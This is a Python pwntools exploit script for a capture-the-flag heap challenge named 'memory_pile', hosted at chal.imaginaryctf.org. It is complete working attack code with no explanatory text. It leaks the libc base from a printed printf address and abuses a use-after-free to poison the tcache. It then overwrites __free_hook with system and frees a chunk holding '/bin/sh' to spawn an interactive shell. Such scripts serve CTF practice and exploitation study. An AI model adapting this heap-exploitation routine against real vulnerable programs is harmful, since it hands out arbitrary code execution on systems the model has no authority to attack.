#!/usr/bin/env python3

from pwn import *

exe = ELF("./memory_pile_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    r = process([exe.path])
    return r

#r = conn()
r = remote("chal.imaginaryctf.org", 42007)

def s(data):
    r.sendlineafter("> ", data)

def malloc(index):
    s("1")
    s(str(index))

def free(index):
    s("2")
    s(str(index))

def fill(index, data):
    s("3")
    s(str(index))
    s(data)

def main():
    
    for _ in range(2):
        r.recvline()

    printf = int(r.recvline().strip(), 16)
    libc.address = printf - libc.sym.printf
    log.warn("Libc base @ 0x%x", libc.address)

    malloc(0)
    free(0)
    fill(0, p64(libc.sym['__free_hook']))
    
    pause()
    malloc(1)
    fill(1, b"/bin/sh\x00")

    malloc(2)
    fill(2, p64(libc.sym['system']))

    free(1)

    r.interactive()


if __name__ == "__main__":
    main()
